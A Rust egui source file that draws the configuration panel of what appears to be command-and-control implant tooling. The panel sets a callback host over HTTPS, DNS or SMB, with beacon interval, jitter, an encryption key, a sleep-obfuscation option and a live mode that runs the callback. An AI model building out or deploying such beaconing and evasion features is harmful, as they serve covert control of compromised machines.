use eframe::egui;

use crate::gui::theme;
use crate::log::LogSink;
use crate::comms::{self, Channel};

const CHANNELS: &[(&str, &str)] = &[
    ("https", "Secure Web Channel"),
    ("dns", "Name Resolution Channel"),
    ("smb", "Network Share Channel"),
];

pub struct CommsState {
    pub selected_channel: usize,
    pub host: String,
    pub port_input: String,
    pub path_input: String,
    pub interval_input: String,
    pub jitter_input: String,
    pub key_input: String,
    pub use_sleep_obfs: bool,
    pub result: Option<String>,
    pub error: String,
}

impl Default for CommsState {
    fn default() -> Self {
        Self {
            selected_channel: 0,
            host: String::new(),
            port_input: "443".to_string(),
            path_input: "/api/status".to_string(),
            interval_input: "60000".to_string(),
            jitter_input: "15".to_string(),
            key_input: String::new(),
            use_sleep_obfs: false,
            result: None,
            error: String::new(),
        }
    }
}

pub fn draw(ui: &mut egui::Ui, state: &mut CommsState, dry_run: &mut bool, log: &LogSink) {
    ui.heading("Communications");
    ui.label("Configure callback channel and transport parameters.");
    ui.add_space(8.0);

    ui.horizontal(|ui| {
        ui.label("Channel:");
        egui::ComboBox::from_id_salt("comms_channel")
            .selected_text(CHANNELS[state.selected_channel].1)
            .show_ui(ui, |ui| {
                for (i, (_, display)) in CHANNELS.iter().enumerate() {
                    ui.selectable_value(&mut state.selected_channel, i, *display);
                }
            });
    });

    ui.add_space(4.0);

    ui.horizontal(|ui| {
        ui.label("Host:");
        ui.text_edit_singleline(&mut state.host);
    });

    ui.horizontal(|ui| {
        ui.label("Port:");
        ui.add(egui::TextEdit::singleline(&mut state.port_input).desired_width(80.0));
        ui.label("Path:");
        ui.text_edit_singleline(&mut state.path_input);
    });

    ui.horizontal(|ui| {
        ui.label("Interval (ms):");
        ui.add(egui::TextEdit::singleline(&mut state.interval_input).desired_width(80.0));
        ui.label("Jitter (%):");
        ui.add(egui::TextEdit::singleline(&mut state.jitter_input).desired_width(60.0));
    });

    ui.horizontal(|ui| {
        ui.label("Key (hex):");
        ui.text_edit_singleline(&mut state.key_input);
    });

    ui.checkbox(&mut state.use_sleep_obfs, "Sleep obfuscation");

    ui.add_space(8.0);

    ui.horizontal(|ui| {
        if *dry_run {
            ui.colored_label(theme::ACCENT_GREEN, "Dry Run: ON");
        } else {
            ui.colored_label(theme::COLOR_WARNING, "Dry Run: OFF — LIVE MODE");
        }
        if ui.button("Switch").clicked() {
            *dry_run = !*dry_run;
        }
    });

    ui.add_space(8.0);

    ui.horizontal(|ui| {
        if ui.button("Execute").clicked() {
            state.error.clear();
            state.result = None;

            let channel_key = CHANNELS[state.selected_channel].0;
            let port: u16 = state.port_input.parse().unwrap_or(443);
            let interval: u32 = state.interval_input.parse().unwrap_or(60000);

            if *dry_run {
                comms::dry_run(channel_key, &state.host, port, interval, log);
            } else {
                if state.host.is_empty() {
                    state.error = "Host is required for live mode".to_string();
                } else if state.key_input.is_empty() {
                    state.error = "Key is required for live mode".to_string();
                } else {
                    match comms::parse_hex_key(&state.key_input) {
                        Ok(key) => {
                            let jitter: u8 = state.jitter_input.parse().unwrap_or(15);
                            let channel = Channel::from_str(channel_key).unwrap_or(Channel::Https);
                            let agent_id = comms::generate_agent_id();
                            let config = comms::CommsConfig {
                                channel,
                                host: state.host.clone(),
                                port,
                                path: state.path_input.clone(),
                                result_path: "/api/result".to_string(),
                                interval_ms: interval,
                                jitter_pct: jitter,
                                key,
                                agent_id,
                                use_sleep_obfs: state.use_sleep_obfs,
                                max_retries: 10,
                            };
                            match comms::run_comms(&config, log) {
                                Ok(r) => {
                                    state.result = Some(r.description);
                                }
                                Err(e) => {
                                    state.error = e;
                                }
                            }
                        }
                        Err(e) => {
                            state.error = format!("Invalid key: {}", e);
                        }
                    }
                }
            }
        }

        if ui.button("Info").clicked() {
            comms::print_info(log);
        }
    });

    if let Some(ref desc) = state.result {
        ui.add_space(4.0);
        ui.colored_label(theme::ACCENT_GREEN, desc);
    }

    if !state.error.is_empty() {
        ui.add_space(4.0);
        ui.colored_label(theme::COLOR_ERROR, &state.error);
    }
}
